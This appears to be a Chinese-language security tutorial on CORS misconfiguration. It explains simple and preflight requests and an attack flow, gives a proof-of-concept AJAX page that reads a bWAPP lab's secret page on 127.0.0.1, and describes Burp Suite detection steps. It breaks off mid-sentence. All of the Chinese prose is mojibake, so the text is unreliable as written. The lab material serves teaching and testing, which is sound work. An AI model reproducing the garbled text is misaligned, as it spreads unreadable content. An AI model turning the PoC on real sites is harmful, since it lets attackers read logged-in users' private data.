HTTPçš„å¤´ä¿¡æ¯ä¸è¶…å‡ºä»¥ä¸‹å‡ ç§å­—æ®µã€‚ Accept Accept-Language Content-Language Lat-Event-ID Content-Typeï¼šåªé™äºä¸‰ä¸ªå€¼application/x-www-form-urlencodedã€multipart/form-dataã€text/plainã€‚è¿™æ˜¯ä¸ºäº†å…¼å®¹è¡¨å•ï¼ˆformï¼‰ï¼Œå› ä¸ºå†å²ä¸Šè¡¨å•ä¸€ç›´å¯ä»¥å‘å‡ºè·¨åŸŸè¯·æ±‚ã€‚AJAX çš„è·¨åŸŸè®¾è®¡å°±æ˜¯ï¼Œåªè¦è¡¨å•å¯ä»¥å‘ï¼ŒAJAX å°±å¯ä»¥ç›´æ¥å‘ã€‚ ï¼ˆ1ï¼‰CORSè·¨åŸŸâ€”â€”ç®€å•è¯·æ±‚çš„æµç¨‹å¯¹äºç®€å•è¯·æ±‚ï¼Œå¤§è‡´æµç¨‹æ˜¯æµè§ˆå™¨å‘ç°è¿™ä¸€æ¬¡å‘æœåŠ¡å™¨æäº¤çš„è¯·æ±‚æ˜¯ç®€å•è¯·æ±‚ï¼Œæ‰€ä»¥è‡ªåŠ¨åœ¨å¤´ä¿¡æ¯ä¸­å¢åŠ äº†ä¸€ä¸ªOriginçš„å­—æ®µï¼Œç”¨æ¥è¡¨ç¤ºè¿™æ¬¡çš„è¯·æ±‚æ¥è‡ªå“ªä¸ªåŸŸã€‚ GET /cors HTTP/1.1Origin: http://api.bob.comHost: api.alice.comAccept-Language: en-USConnection: keep-aliveUser-Agent: Mozilla/5.0... ä¸Šé¢çš„å¤´ä¿¡æ¯ä¸­ï¼ŒOriginå­—æ®µç”¨æ¥è¯´æ˜ï¼Œæœ¬æ¬¡è¯·æ±‚æ¥è‡ªå“ªä¸ªæºï¼ˆåè®® + åŸŸå + ç«¯å£ï¼‰ã€‚æœåŠ¡å™¨æ ¹æ®è¿™ä¸ªå€¼ï¼Œå†³å®šæ˜¯å¦åŒæ„è¿™æ¬¡è¯·æ±‚ã€‚ å¦‚æœOriginæŒ‡å®šçš„æºï¼Œä¸åœ¨è®¸å¯èŒƒå›´å†…ï¼ŒæœåŠ¡å™¨ä¼šè¿”å›ä¸€ä¸ªæ­£å¸¸çš„HTTPå›åº”ã€‚æµè§ˆå™¨å‘ç°ï¼Œè¿™ä¸ªå›åº”çš„å¤´ä¿¡æ¯æ²¡æœ‰åŒ…å«Access-Control-Allow-Originå­—æ®µï¼ˆè¯¦è§ä¸‹æ–‡ï¼‰ï¼Œå°±çŸ¥é“å‡ºé”™äº†ï¼Œä»è€ŒæŠ›å‡ºä¸€ä¸ªé”™è¯¯ï¼Œè¢«XMLHttpRequestçš„onerrorå›è°ƒå‡½æ•°æ•è·ã€‚æ³¨æ„ï¼Œè¿™ç§é”™è¯¯æ— æ³•é€šè¿‡çŠ¶æ€ç è¯†åˆ«ï¼Œå› ä¸ºHTTPå›åº”çš„çŠ¶æ€ç æœ‰å¯èƒ½æ˜¯200ã€‚ å¦‚æœOriginæŒ‡å®šçš„åŸŸååœ¨è®¸å¯èŒƒå›´å†…ï¼ŒæœåŠ¡å™¨è¿”å›çš„å“åº”ï¼Œä¼šå¤šå‡ºå‡ ä¸ªå¤´ä¿¡æ¯å­—æ®µã€‚ Access-Control-Allow-Origin: http://api.bob.comAccess-Control-Allow-Credentials: trueAccess-Control-Expose-Headers: FooBarContent-Type: text/html; charset=utf-8 ä¸Šé¢çš„å¤´ä¿¡æ¯ä¹‹ä¸­ï¼Œæœ‰ä¸‰ä¸ªä¸CORSè¯·æ±‚ç›¸å…³çš„å­—æ®µï¼Œéƒ½ä»¥Access-Control-å¼€å¤´ã€‚ Access-Control-Allow-Originï¼šè¯¥å­—æ®µæ˜¯å¿…é¡»å­˜åœ¨çš„ï¼Œå®ƒçš„å€¼å¯èƒ½æ˜¯ Origin å­—æ®µçš„å€¼æˆ–è€…æ˜¯ä¸€ä¸ªé€šé…ç¬¦â€œ*â€ï¼Œè¡¨ç¤ºå¯ä»¥æ¥å—ä»»æ„åŸŸåçš„è¯·æ±‚ï¼Œå½“ç„¶å¤§éƒ¨åˆ†æœåŠ¡å™¨å¦‚æœé…ç½®äº†é€šé…ç¬¦çš„è¯ï¼Œä¿¡æ¯æ³„éœ²çš„é£é™©éª¤ç„¶åŠ å¤§ï¼› Access-Control-Allow-Credentialsï¼šè¯¥å­—æ®µå¯é€‰ã€‚å®ƒçš„å€¼æ˜¯ä¸€ä¸ªå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºæ˜¯å¦å…è®¸å‘é€Cookieã€‚é»˜è®¤æƒ…å†µä¸‹ï¼ŒCookieä¸åŒ…æ‹¬åœ¨CORSè¯·æ±‚ä¹‹ä¸­ã€‚è®¾ä¸ºtrueï¼Œå³è¡¨ç¤ºæœåŠ¡å™¨æ˜ç¡®è®¸å¯ï¼ŒCookieå¯ä»¥åŒ…å«åœ¨è¯·æ±‚ä¸­ï¼Œä¸€èµ·å‘ç»™æœåŠ¡å™¨ã€‚è¿™ä¸ªå€¼ä¹Ÿåªèƒ½è®¾ä¸ºtrueï¼Œå¦‚æœæœåŠ¡å™¨ä¸è¦æµè§ˆå™¨å‘é€Cookieï¼Œåˆ é™¤è¯¥å­—æ®µå³å¯ã€‚ä½†éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœè¦å‘é€ cookieï¼ŒAccess-Control-Allow-Origin å°±ä¸èƒ½è®¾ä¸ºæ˜Ÿå·ï¼Œå¿…é¡»æ˜ç¡®æŒ‡å®šä¸è¯·æ±‚ç½‘é¡µä¸€è‡´çš„åŸŸåï¼ŒåŒæ—¶Cookieä¾ç„¶éµå¾ªåŒæºç­–ç•¥ï¼Œ åªæœ‰ç”¨æœåŠ¡å™¨åŸŸåè®¾ç½®çš„Cookieæ‰ä¼šä¸Šä¼ ï¼Œå…¶ä»–åŸŸåçš„Cookieå¹¶ä¸ä¼šä¸Šä¼ ï¼Œä¸”ï¼ˆè·¨æºï¼‰åŸç½‘é¡µä»£ç ä¸­çš„document.cookieä¹Ÿæ— æ³•è¯»å–æœåŠ¡å™¨åŸŸåä¸‹çš„Cookieã€‚ Access-Control-Expose-Headersï¼šè¯¥å­—æ®µå¯é€‰ã€‚CORSè¯·æ±‚æ—¶ï¼ŒXMLHttpRequestå¯¹è±¡çš„getResponseHeader()æ–¹æ³•åªèƒ½æ‹¿åˆ°6ä¸ªåŸºæœ¬å­—æ®µï¼šCache-Controlã€Content-Languageã€Content-Typeã€Expiresã€Last-Modifiedã€Pragmaã€‚å¦‚æœæƒ³æ‹¿åˆ°å…¶ä»–å­—æ®µï¼Œå°±å¿…é¡»åœ¨Access-Control-Expose-Headersé‡Œé¢æŒ‡å®šã€‚ä¸Šé¢çš„ä¾‹å­æŒ‡å®šï¼ŒgetResponseHeader(&#39;FooBar&#39;)å¯ä»¥è¿”å›FooBarå­—æ®µçš„å€¼ã€‚ å…·ä½“çš„CORSç®€å•è·¨åŸŸè¯·æ±‚æµç¨‹å¦‚ä¸‹ withCredentials å±æ€§ä¸Šé¢è¯´åˆ°ï¼ŒCORSè¯·æ±‚é»˜è®¤ä¸å‘é€Cookieå’ŒHTTPè®¤è¯ä¿¡æ¯ã€‚å¦‚æœè¦æŠŠCookieå‘åˆ°æœåŠ¡å™¨ï¼Œä¸€æ–¹é¢è¦æœåŠ¡å™¨åŒæ„ï¼ŒæŒ‡å®šAccess-Control-Allow-Credentialså­—æ®µã€‚ Access-Control-Allow-Credentials: true å¦ä¸€æ–¹é¢ï¼Œå¼€å‘è€…å¿…é¡»åœ¨AJAXè¯·æ±‚ä¸­æ‰“å¼€withCredentialså±æ€§ var xhr = new XMLHttpRequest();xhr.withCredentials = true; å¦åˆ™ï¼Œå³ä½¿æœåŠ¡å™¨åŒæ„å‘é€Cookieï¼Œæµè§ˆå™¨ä¹Ÿä¸ä¼šå‘é€ã€‚æˆ–è€…ï¼ŒæœåŠ¡å™¨è¦æ±‚è®¾ç½®Cookieï¼Œæµè§ˆå™¨ä¹Ÿä¸ä¼šå¤„ç†ã€‚ ä½†æ˜¯ï¼Œå¦‚æœçœç•¥withCredentialsè®¾ç½®ï¼Œæœ‰çš„æµè§ˆå™¨è¿˜æ˜¯ä¼šä¸€èµ·å‘é€Cookieã€‚è¿™æ—¶ï¼Œå¯ä»¥æ˜¾å¼å…³é—­withCredentialsã€‚ xhr.withCredentials = false; ï¼ˆ2ï¼‰CORSè·¨åŸŸâ€”â€”éç®€å•è¯·æ±‚çš„æµç¨‹æ‰€è°“éç®€å•è¯·æ±‚å°±æ˜¯é‚£ç§å¯¹æœåŠ¡å™¨æå‡ºç‰¹æ®Šè¦æ±‚çš„è¯·æ±‚ï¼Œä¾‹å¦‚è¯·æ±‚æ–¹æ³•ä¸º PUT æˆ– DELETEã€‚éç®€å•çš„ CORS è¯·æ±‚ä¼šåœ¨æ­£å¼é€šä¿¡ä¹‹å‰ï¼Œå¢åŠ ä¸€æ¬¡ HTTP æŸ¥è¯¢è¯·æ±‚ï¼Œç§°ä¹‹ä¸º â€œé¢„æ£€è¯·æ±‚â€ï¼ˆpreflightï¼‰ ã€‚æµè§ˆå™¨å…ˆè¯¢é—®æœåŠ¡å™¨ï¼Œå½“å‰ç½‘é¡µæ‰€åœ¨çš„åŸŸåæ˜¯å¦åœ¨æœåŠ¡å™¨çš„è®¸å¯åå•é‡Œä»¥åŠå¯ä»¥ä½¿ç”¨å“ªäº› HTTP åŠ¨è¯å’Œå¤´ä¿¡æ¯å­—æ®µã€‚åªæœ‰è·å¾—äº†è‚¯å®šå“åº”ï¼Œæµè§ˆå™¨æ‰ä¼šæ­£å¼å‘å‡º XMLHttpRequest è¯·æ±‚ï¼Œå¦åˆ™å°±æŠ¥é”™ã€‚è¿™ç§è¯·æ±‚çš„å¥½å¤„æ˜¯å¯¹ä¼ ç»Ÿçš„æ²¡æœ‰ CORS æ”¯æŒçš„æœåŠ¡å™¨å‡å°å‹åŠ›ï¼Œç»™æœåŠ¡å™¨ä¸€ä¸ªæå‰æ‹’ç»çš„æœºä¼šã€‚ â‘  é¢„æ£€è¯·æ±‚ä¸‹é¢æ˜¯ä¸€æ®µæµè§ˆå™¨çš„JavaScriptè„šæœ¬ã€‚ var url = &#x27;http://api.alice.com/cors&#x27;;var xhr = new XMLHttpRequest();xhr.open(&#x27;PUT&#x27;, url, true);xhr.setRequestHeader(&#x27;X-Custom-Header&#x27;, &#x27;value&#x27;);xhr.send(); ä¸Šé¢ä»£ç ä¸­ï¼ŒHTTPè¯·æ±‚çš„æ–¹æ³•æ˜¯PUTï¼Œå¹¶ä¸”å‘é€ä¸€ä¸ªè‡ªå®šä¹‰å¤´ä¿¡æ¯X-Custom-Headerã€‚ æµè§ˆå™¨å‘ç°ï¼Œè¿™æ˜¯ä¸€ä¸ªéç®€å•è¯·æ±‚ï¼Œå°±è‡ªåŠ¨å‘å‡ºä¸€ä¸ªâ€é¢„æ£€â€è¯·æ±‚ï¼Œè¦æ±‚æœåŠ¡å™¨ç¡®è®¤å¯ä»¥è¿™æ ·è¯·æ±‚ã€‚ä¸‹é¢æ˜¯è¿™ä¸ªâ€é¢„æ£€â€è¯·æ±‚çš„HTTPå¤´ä¿¡æ¯ã€‚ OPTIONS /cors HTTP/1.1Origin: http://api.bob.comAccess-Control-Request-Method: PUTAccess-Control-Request-Headers: X-Custom-HeaderHost: api.alice.comAccept-Language: en-USConnection: keep-aliveUser-Agent: Mozilla/5.0... â€œé¢„æ£€â€è¯·æ±‚ç”¨çš„è¯·æ±‚æ–¹æ³•æ˜¯OPTIONSï¼Œè¡¨ç¤ºè¿™ä¸ªè¯·æ±‚æ˜¯ç”¨æ¥è¯¢é—®çš„ã€‚å¤´ä¿¡æ¯é‡Œé¢ï¼Œå…³é”®å­—æ®µæ˜¯Originï¼Œè¡¨ç¤ºè¯·æ±‚æ¥è‡ªå“ªä¸ªæºã€‚ é™¤äº†Originå­—æ®µï¼Œâ€é¢„æ£€â€è¯·æ±‚çš„å¤´ä¿¡æ¯åŒ…æ‹¬ä¸¤ä¸ªç‰¹æ®Šå­—æ®µã€‚ ï¼ˆ1ï¼‰Access-Control-Request-Method è¯¥å­—æ®µæ˜¯å¿…é¡»çš„ï¼Œç”¨æ¥åˆ—å‡ºæµè§ˆå™¨çš„CORSè¯·æ±‚ä¼šç”¨åˆ°å“ªäº›HTTPæ–¹æ³•ï¼Œä¸Šä¾‹æ˜¯PUTã€‚ ï¼ˆ2ï¼‰Access-Control-Request-Headers è¯¥å­—æ®µæ˜¯ä¸€ä¸ªé€—å·åˆ†éš”çš„å­—ç¬¦ä¸²ï¼ŒæŒ‡å®šæµè§ˆå™¨CORSè¯·æ±‚ä¼šé¢å¤–å‘é€çš„å¤´ä¿¡æ¯å­—æ®µï¼Œä¸Šä¾‹æ˜¯X-Custom-Headerã€‚ â‘¡ é¢„æ£€è¯·æ±‚çš„å›åº”æœåŠ¡å™¨æ”¶åˆ°â€é¢„æ£€â€è¯·æ±‚ä»¥åï¼Œæ£€æŸ¥äº†Originã€Access-Control-Request-Methodå’ŒAccess-Control-Request-Headerså­—æ®µä»¥åï¼Œç¡®è®¤å…è®¸è·¨æºè¯·æ±‚ï¼Œå°±å¯ä»¥åšå‡ºå›åº”ã€‚ HTTP/1.1 200 OKDate: Mon, 01 Dec 2008 01:15:39 GMTServer: Apache/2.0.61 (Unix)Access-Control-Allow-Origin: http://api.bob.comAccess-Control-Allow-Methods: GET, POST, PUTAccess-Control-Allow-Headers: X-Custom-HeaderContent-Type: text/html; charset=utf-8Content-Encoding: gzipContent-Length: 0Keep-Alive: timeout=2, max=100Connection: Keep-AliveContent-Type: text/plain ä¸Šé¢çš„HTTPå›åº”ä¸­ï¼Œå…³é”®çš„æ˜¯Access-Control-Allow-Originå­—æ®µï¼Œè¡¨ç¤ºhttp://api.bob.comå¯ä»¥è¯·æ±‚æ•°æ®ã€‚è¯¥å­—æ®µä¹Ÿå¯ä»¥è®¾ä¸ºæ˜Ÿå·ï¼Œè¡¨ç¤ºåŒæ„ä»»æ„è·¨æºè¯·æ±‚ã€‚ å¦‚æœæœåŠ¡å™¨å¦å®šäº†â€é¢„æ£€â€è¯·æ±‚ï¼Œä¼šè¿”å›ä¸€ä¸ªæ­£å¸¸çš„HTTPå›åº”ï¼Œä½†æ˜¯æ²¡æœ‰ä»»ä½•CORSç›¸å…³çš„å¤´ä¿¡æ¯å­—æ®µã€‚è¿™æ—¶ï¼Œæµè§ˆå™¨å°±ä¼šè®¤å®šï¼ŒæœåŠ¡å™¨ä¸åŒæ„é¢„æ£€è¯·æ±‚ï¼Œå› æ­¤è§¦å‘ä¸€ä¸ªé”™è¯¯ï¼Œè¢«XMLHttpRequestå¯¹è±¡çš„onerrorå›è°ƒå‡½æ•°æ•è·ã€‚æ§åˆ¶å°ä¼šæ‰“å°å‡ºå¦‚ä¸‹çš„æŠ¥é”™ä¿¡æ¯ã€‚ XMLHttpRequest cannot load http://api.alice.com.Origin http://api.bob.com is not allowed by Access-Control-Allow-Origin. æœåŠ¡å™¨å›åº”çš„å…¶ä»–CORSç›¸å…³å­—æ®µå¦‚ä¸‹ã€‚ Access-Control-Allow-Methods: GET, POST, PUTAccess-Control-Allow-Headers: X-Custom-HeaderAccess-Control-Allow-Credentials: trueAccess-Control-Max-Age: 1728000 ï¼ˆ1ï¼‰Access-Control-Allow-Methods è¯¥å­—æ®µå¿…éœ€ï¼Œå®ƒçš„å€¼æ˜¯é€—å·åˆ†éš”çš„ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œè¡¨æ˜æœåŠ¡å™¨æ”¯æŒçš„æ‰€æœ‰è·¨åŸŸè¯·æ±‚çš„æ–¹æ³•ã€‚æ³¨æ„ï¼Œè¿”å›çš„æ˜¯æ‰€æœ‰æ”¯æŒçš„æ–¹æ³•ï¼Œè€Œä¸å•æ˜¯æµè§ˆå™¨è¯·æ±‚çš„é‚£ä¸ªæ–¹æ³•ã€‚è¿™æ˜¯ä¸ºäº†é¿å…å¤šæ¬¡â€é¢„æ£€â€è¯·æ±‚ã€‚ ï¼ˆ2ï¼‰Access-Control-Allow-Headers å¦‚æœæµè§ˆå™¨è¯·æ±‚åŒ…æ‹¬Access-Control-Request-Headerså­—æ®µï¼Œåˆ™Access-Control-Allow-Headerså­—æ®µæ˜¯å¿…éœ€çš„ã€‚å®ƒä¹Ÿæ˜¯ä¸€ä¸ªé€—å·åˆ†éš”çš„å­—ç¬¦ä¸²ï¼Œè¡¨æ˜æœåŠ¡å™¨æ”¯æŒçš„æ‰€æœ‰å¤´ä¿¡æ¯å­—æ®µï¼Œä¸é™äºæµè§ˆå™¨åœ¨â€é¢„æ£€â€ä¸­è¯·æ±‚çš„å­—æ®µã€‚ ï¼ˆ3ï¼‰Access-Control-Allow-Credentials è¯¥å­—æ®µä¸ç®€å•è¯·æ±‚æ—¶çš„å«ä¹‰ç›¸åŒã€‚ ï¼ˆ4ï¼‰Access-Control-Max-Age è¯¥å­—æ®µå¯é€‰ï¼Œç”¨æ¥æŒ‡å®šæœ¬æ¬¡é¢„æ£€è¯·æ±‚çš„æœ‰æ•ˆæœŸï¼Œå•ä½ä¸ºç§’ã€‚ä¸Šé¢ç»“æœä¸­ï¼Œæœ‰æ•ˆæœŸæ˜¯20å¤©ï¼ˆ1728000ç§’ï¼‰ï¼Œå³å…è®¸ç¼“å­˜è¯¥æ¡å›åº”1728000ç§’ï¼ˆå³20å¤©ï¼‰ï¼Œåœ¨æ­¤æœŸé—´ï¼Œä¸ç”¨å‘å‡ºå¦ä¸€æ¡é¢„æ£€è¯·æ±‚ã€‚ â‘¢ æµè§ˆå™¨çš„æ­£å¸¸è¯·æ±‚å’Œå›åº”ä¸€æ—¦æœåŠ¡å™¨é€šè¿‡äº†â€é¢„æ£€â€è¯·æ±‚ï¼Œä»¥åæ¯æ¬¡æµè§ˆå™¨æ­£å¸¸çš„CORSè¯·æ±‚ï¼Œå°±éƒ½è·Ÿç®€å•è¯·æ±‚ä¸€æ ·ï¼Œä¼šæœ‰ä¸€ä¸ªOriginå¤´ä¿¡æ¯å­—æ®µã€‚æœåŠ¡å™¨çš„å›åº”ï¼Œä¹Ÿéƒ½ä¼šæœ‰ä¸€ä¸ªAccess-Control-Allow-Originå¤´ä¿¡æ¯å­—æ®µã€‚ ä¸‹é¢æ˜¯â€é¢„æ£€â€è¯·æ±‚ä¹‹åï¼Œæµè§ˆå™¨çš„æ­£å¸¸CORSè¯·æ±‚ã€‚ PUT /cors HTTP/1.1Origin: http://api.bob.comHost: api.alice.comX-Custom-Header: valueAccept-Language: en-USConnection: keep-aliveUser-Agent: Mozilla/5.0... ä¸Šé¢å¤´ä¿¡æ¯çš„Originå­—æ®µæ˜¯æµè§ˆå™¨è‡ªåŠ¨æ·»åŠ çš„ã€‚ ä¸‹é¢æ˜¯æœåŠ¡å™¨æ­£å¸¸çš„å›åº”ã€‚ Access-Control-Allow-Origin: http://api.bob.comContent-Type: text/html; charset=utf-8 â‘£ æ€»ç»“ å…·ä½“æµç¨‹å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œå½“æ„é€ è¯·æ±‚åŒ…çš„æ–¹æ³•æ˜¯ PUT æˆ– DELETE å¹¶ä¼ ç»™æµè§ˆå™¨æ—¶ï¼Œæµè§ˆå™¨å‘ç°æ­¤è¯·æ±‚æ˜¯éç®€å•è¯·æ±‚æ‰€ä»¥æµè§ˆå™¨æ„é€ ä¸€ä¸ªé¢„æ£€è¯·æ±‚åŒ…ï¼Œè¯·æ±‚å¤´æ˜¯ OPTIONSï¼Œå¹¶æºå¸¦ä¸‰ä¸ªå…³é”®å­—æ®µï¼šOriginã€Access-Control-Request-Methodã€Access-Control-Request-Headersã€‚å…¶ä¸­ Access-Control-Request-Method è¡¨ç¤ºæµè§ˆå™¨çš„ CORS è¯·æ±‚ä¼šç”¨åˆ°å“ªäº›HTTPæ–¹æ³•ï¼Œ Access-Control-Request-Headers è¡¨ç¤ºæµè§ˆå™¨ CORS è¯·æ±‚ä¼šé¢å¤–å‘é€çš„å¤´ä¿¡æ¯å­—æ®µã€‚æœåŠ¡å™¨æ”¶åˆ°é¢„æ£€è¯·æ±‚åï¼Œæ£€æŸ¥äº†ä¸‰ä¸ªæ ¸å¿ƒå­—æ®µä»¥åå¦‚æœç¡®å®šå…è®¸è·¨åŸŸè¯·æ±‚ï¼Œä¼šè¿”å›ä¸€ä¸ªæ­£å¸¸çš„ HTTP å›åº”ï¼Œå¹¶æºå¸¦ä¼ å…¥çš„ CORS å¤´ä¿¡æ¯ã€‚å¦‚æœæœåŠ¡å™¨å¦å®šè¯·æ±‚ï¼Œè™½ç„¶ä¹Ÿä¼šè¿”å›ä¸€ä¸ªæ­£å¸¸çš„ HTTP å›åº”ä½†æ˜¯æ²¡æœ‰ä»»ä½• CORS ç›¸å…³çš„å¤´ä¿¡æ¯å­—æ®µï¼Œæˆ–æ˜ç¡®è¡¨ç¤ºè¯·æ±‚ä¸ç¬¦åˆæ¡ä»¶ã€‚æµè§ˆå™¨æ ¹æ®é¢„è¯·æ±‚çš„è¿”å›ç»“æœå†³å®šæ¥ä¸‹æ¥æ˜¯è¿›è¡Œç®€å•è¯·æ±‚è¿˜æ˜¯æ‹’ç»è¯·æ±‚ã€‚ 2ã€æ”»å‡»æµç¨‹CORS ä½¿ç”¨æ£€æŸ¥è¯·æ±‚å¤´çš„ç›¸å…³å­—æ®µå’ŒæœåŠ¡ç«¯çš„è§„åˆ™è¿›è¡Œå¯¹æ¯”ï¼Œæ¥é€‰æ‹©æ˜¯å¦å…è®¸è·¨åŸŸã€‚ä½†å‡¡æ˜¯éœ€è¦é…ç½®è§„åˆ™çš„ç¨‹åºï¼Œé¿å…ä¸äº†ä¼šå‡ºç°ä¸€äº›æ„å¤–ï¼Œå°±åƒå¾ˆå¤šèµ„æ·±ç¨‹åºå‘˜æœ‰æ—¶ä¹Ÿä¼šå†™ä¸å‡ºæ°å½“çš„æ­£åˆ™ä¸€æ ·ï¼Œå½“æœåŠ¡ç«¯é…ç½®çš„è§„åˆ™ä¸å¤Ÿåˆç†ï¼Œå¯¼è‡´éåŒåŸŸçš„èµ„æºå¯ä»¥äº’ç›¸è®¿é—®ï¼Œä¾‹å¦‚Access-Control-Allow-Origin: *ã€‚ CORS åè€Œä½¿åŒæºç­–ç•¥çš„ä¿æŠ¤æœºåˆ¶åœŸå´©ç“¦è§£ã€‚å› æ­¤ï¼ŒCORS æ¼æ´çš„æˆå› å¾ˆæ˜æ˜¾ï¼Œå°±æ˜¯æœåŠ¡ç«¯é…ç½®çš„è§„åˆ™ä¸å½“æ‰€å¯¼è‡´çš„ã€‚ CORS è·¨åŸŸæ¼æ´çš„æ”»å‡»æµç¨‹å¦‚ä¸Šå›¾æ‰€ç¤ºï¼š å‡è®¾ç”¨æˆ·ç™»é™†ä¸€ä¸ªå«æœ‰ CORS é…ç½®ç½‘ç«™ vuln.comï¼ŒåŒæ—¶åˆè®¿é—®äº†æ”»å‡»è€…æä¾›çš„ä¸€ä¸ªé“¾æ¥ evil.comã€‚ evil.com çš„ç½‘ç«™å‘ vuln.com è¿™ä¸ªç½‘ç«™å‘èµ·è¯·æ±‚è·å–æ•æ„Ÿæ•°æ®ï¼Œæµè§ˆå™¨èƒ½å¦æ¥æ”¶ä¿¡æ¯å–å†³äº vuln.com çš„é…ç½®ã€‚ å¦‚æœ vuln.com é…ç½®äº† Access-Control-Allow-Origin å¤´ä¸”ä¸ºé¢„æœŸï¼Œé‚£ä¹ˆå…è®¸æ¥æ”¶ï¼Œå¦åˆ™æµè§ˆå™¨ä¼šå› ä¸ºåŒæºç­–ç•¥è€Œä¸æ¥æ”¶ã€‚ 3ã€æ¼æ´éªŒè¯è¿™æ˜¯ä¸€ä¸ªæ­£å¸¸çš„GETè¯·æ±‚åŒ… å…¶æ­£å¸¸å“åº”åŒ…ä¸º æˆ‘ä»¬ç°åœ¨åœ¨è¯¥è¯·æ±‚åŒ…ä¸Šé¢æ·»åŠ ä¸€ä¸ªoriginå‚æ•° è¿”å›åŒ…çš„æ•°æ®ä¸­å‡ºç°äº†å¯¹åº”çš„ CORS å“åº”å¤´ï¼š å…¶ä¸­Access-Control-Allow-OriginæŒ‡æ˜¯å…è®¸è®¿é—®çš„æºï¼ŒAccess-Control-Allow-CredentialsæŒ‡çš„æ˜¯å…è®¸å¸¦ä¸Š cookie è®¿é—®èµ„æºï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ POST è·å–åˆ°è®¿é—®è€…çš„ cookie ä¿¡æ¯ã€‚ 4ã€é¶åœºå®ä¾‹ä»¥ BWAPP é¶åœº Low çº§åˆ«çš„ CORS æ¼æ´ç¯å¢ƒä½œä¸ºæ¼”ç¤ºæ¡ˆä¾‹ ç‚¹å‡» secret è·³è½¬åˆ°å¦‚ä¸‹é¡µé¢ï¼Œè—ç€ Neo çš„ç§˜å¯†ï¼š ç°åœ¨æ”»å‡»è€…çš„ç›®çš„æ˜¯ç›—å–è¯¥é¡µé¢é‡Œé¢çš„ sercet å¯†ç å†…å®¹ï¼ŒæŸ¥çœ‹è¯·æ±‚è¿™ä¸ªé¡µé¢æ—¶çš„HTTPå“åº”å¤´ï¼Œä»Access-Control-Allow-Originï¼š* å¤´å¯ä»¥çœ‹å‡ºæœåŠ¡å™¨é…ç½®äº† CORSï¼Œä¸”æ‰€æœ‰çš„æºæœåŠ¡å™¨éƒ½å¯ä»¥åŠ è½½è¿™ä¸ªé¡µé¢ä¸Šçš„èµ„æºï¼š æ”»å‡»è€…å¯ä»¥ç›´æ¥å‘é€ä¸€ä¸ªè‡ªå·±æ„é€ çš„é¡µé¢é“¾æ¥ç»™ç”¨æˆ·ï¼Œå½“ç”¨æˆ·ç‚¹å‡»åï¼Œæ”»å‡»é¡µé¢ä½¿ç”¨ ajax å°±å¯ä»¥ç›´æ¥è¯»å–å¦ä¸€ä¸ª BWAPP é¶åœºç½‘ç«™çš„ç›®æ ‡ç½‘é¡µæ•æ„Ÿä¿¡æ¯ï¼Œæ”»å‡»é¡µé¢ test.html æºç å¦‚ä¸‹ï¼š &lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt; &lt;script&gt; window.onload = function()&#123; var xhr =new XMLHttpRequest();// åˆ›å»ºAJAXçš„å¯¹è±¡ // è®¾ç½®ä½¿ç”¨çš„è¯·æ±‚æ–¹å¼ xhr.open(&#x27;get&#x27;,&#x27;http://127.0.0.1/bwAPP2.2/bwAPP/secret-cors-1.php&#x27;,true); xhr.send(); // å‘é€è¯·æ±‚ xhr.onreadystatechange=function()&#123; if(xhr.readyState === 4 )&#123; // çŠ¶æ€ 4 è¡¨ç¤ºæœåŠ¡å™¨å·²å“åº” // åˆ¤æ–­æ­£å¸¸çš„å“åº”ç»“æœçš„çŠ¶æ€ç  if(xhr.status &gt;=200 &amp;&amp; xhr.status&lt;300 || xhr.status === 304)&#123; console.log(xhr.responseText); // è·å–å“åº”ä½“å†…å®¹ &#125;else&#123; console.log(&#x27;0&#x27;); &#125; &#125; &#125; &#125; &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; æ­¤å¤„å°†è¯¥é¡µé¢æ”¾åœ¨æœ¬åœ° PhpStudy æ­å»ºçš„æœåŠ¡ä¸‹ï¼Œå¹¶åœ¨æµè§ˆå™¨è¿›è¡Œè®¿é—®ï¼Œå°†æˆåŠŸè·¨åŸŸå‘é€èµ„æºè¯·æ±‚å¹¶è¿”å›æƒ³è¦çš„æ•æ„Ÿä¿¡æ¯ï¼ˆæ§åˆ¶å°æ‰“å°ï¼‰ï¼š æˆ–è€…ç›´æ¥ä½¿ç”¨evalç›®å½•ä¸‹çš„attack-cors.htmï¼Œä¿®æ”¹ç›®æ ‡æœåŠ¡å™¨è·¯å¾„å³å¯ 5ã€æ£€æµ‹æ–¹æ³•å¦‚ä½•åœ¨å¹³å¸¸æµ‹è¯•ä¸­æ£€æŸ¥ CORS è·¨åŸŸæ¼æ´ï¼Ÿ CORS æ¼æ´ä¸»è¦çœ‹å½“æˆ‘ä»¬å‘èµ·çš„è¯·æ±‚ä¸­å¸¦æœ‰ Origin å¤´éƒ¨å­—æ®µæ—¶ï¼ŒæœåŠ¡å™¨çš„è¿”å›åŒ…å¸¦æœ‰ CORS çš„ç›¸å…³å­—æ®µå¹¶ä¸”å…è®¸ Origin çš„åŸŸè®¿é—®ã€‚ ä¸€èˆ¬æµ‹è¯•WEBæ¼æ´éƒ½ä¼šç”¨ä¸ŠBurpSuiteï¼Œè€ŒBurpSuiteå¯ä»¥å®ç°å¸®åŠ©æˆ‘ä»¬æ£€æµ‹è¿™ä¸ªæ¼æ´ã€‚ é¦–å…ˆæ˜¯è‡ªåŠ¨åœ¨ HTTP è¯·æ±‚åŒ…ä¸­åŠ ä¸Š Origin çš„å¤´éƒ¨å­—æ®µï¼Œæ‰“å¼€BurpSuiteï¼Œé€‰æ‹© Proxy æ¨¡å—ä¸­çš„ Options é€‰é¡¹ï¼Œæ‰¾åˆ° Match and Replace è¿™ä¸€æ ï¼Œå‹¾é€‰ Request header å°†ç©ºæ›¿æ¢ä¸º Origin:foo.example.org çš„Enableæ¡†ï¼š ç„¶åæˆ‘ä»¬å°±å¯ä»¥å¼€å§‹å»è®¿é—®æˆ‘ä»¬è®¤ä¸ºæœ‰æ¼æ´çš„ç½‘ç«™ï¼Œè®¿é—®è¶³å¤Ÿå¤šååœ¨ BurpSuite çš„ Proxy æ¨¡å—ä¸‹çš„ HTTP history æ¥ç­›é€‰å¸¦æœ‰ CORS 